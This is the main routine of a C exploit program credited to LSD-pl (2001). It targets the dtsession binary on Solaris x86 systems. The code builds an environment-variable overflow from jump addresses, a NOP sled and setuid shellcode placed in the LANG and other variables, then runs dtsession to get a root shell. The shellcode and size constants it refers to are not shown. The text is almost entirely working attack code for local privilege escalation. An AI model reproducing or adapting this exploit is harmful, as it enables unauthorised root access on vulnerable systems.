main(int argc,char **argv){
    char buffer[20000],*b,adr[4],pch[4],jmp[4],*envp[4],display[128];
    unsigned int i;

    printf("copyright LAST STAGE OF DELIRIUM mar 2001 poland  //lsd-pl.net/\n");
    printf("/usr/dt/bin/dtsession for solaris 2.7 (2.6,2.8 ?) x86\n\n");

    if(argc!=2){
        printf("usage: %s xserver:display\n",argv[0]);
        exit(-1);
    }

    *((unsigned int*)adr)=((*(unsigned int(*)())jump)())+3540+3000-0x4d0;
    *((unsigned int*)pch)=((*(unsigned int(*)())jump)())+3540+3000+6000;
    *((unsigned int*)jmp)=((*(unsigned int(*)())jump)())+3540+3000+6000+6000;

    *((unsigned int*)adr)=(((i=*((unsigned int*)adr))>>8))|(i<<24);

    sprintf(display,"DISPLAY=%s",argv[1]);
    envp[0]=&buffer[0];
    envp[1]=&buffer[19000];
    envp[2]=display;
    envp[3]=0;

    b=buffer;
    sprintf(b,"xxx=");
    b+=4;
    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
    for(i=0;i<JMPNUM;i++) *b++=jmp[i%4];
    for(i=0;i<NOPNUM;i++) *b++=0x90;
    for(i=0;i<strlen(setuidshellcode);i++) *b++=setuidshellcode[i];
    *b=0;

    b=&buffer[19000];
    sprintf(b,"LANG=");
    b+=5;
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    execle("/usr/dt/bin/dtsession","lsd",0,envp);
}